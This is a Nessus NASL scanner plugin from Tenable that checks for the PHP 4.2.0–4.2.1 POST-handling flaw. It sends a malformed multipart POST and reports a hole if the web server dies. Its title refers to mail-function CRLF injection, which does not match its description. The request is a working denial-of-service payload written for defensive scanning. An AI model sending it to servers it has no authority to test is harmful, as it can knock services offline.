#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID
#
# Incidentally covers CVE-2002-0985 and 986
#


include("compat.inc");

if(description)
{
 script_id(11050);
 script_version("$Revision: 1.25 $");
 script_cve_id("CVE-2002-0986");
 script_bugtraq_id(5278);
 script_xref(name:"OSVDB", value:"2160");
 script_xref(name:"SuSE", value:"SUSE-SA:2002:036");

 script_name(english:"PHP < 4.2.x mail Function CRLF Injection");

 script_set_attribute(attribute:"synopsis", value:
"Arbitrary code may be run on the remote host." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of PHP earlier
than 4.2.2.

The new POST handling system in PHP 4.2.0 and 4.2.1 has
a bug which allows an attacker to disable the remote server
or to compromise it." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to PHP 4.2.2 or downgrade to 4.1.2." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 script_end_attributes();

 script_summary(english:"Checks for version of PHP");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl", "webmirror.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("backport.inc");


port = get_http_port(default:80);
banner = get_http_banner(port:port);
if(!banner)exit(0);
php = get_php_version(banner:banner);
if ( ! php ) exit(0);
if ( ! can_host_php(port:port) ) exit(0);

if (http_is_dead(port: port)) exit(0);


files = get_kb_list(string("www/", port, "/content/extensions/php*"));
if(isnull(files))file = "/index.php";
else
{
  files = make_list(files);
  file = files[0];
}
  
if(is_cgi_installed3(item:file, port:port))
{
  r = http_send_recv3(method: "POST", port: port, item: file,
add_headers: make_array("Content-type", "multipart/form-data; boundary=nessus"),
data: '--nessus\r\nContent-Disposition: foo=bar;\r\n\r\n\r\n');
  if (http_is_dead(port: port, retry: 3)) security_hole(port);
}
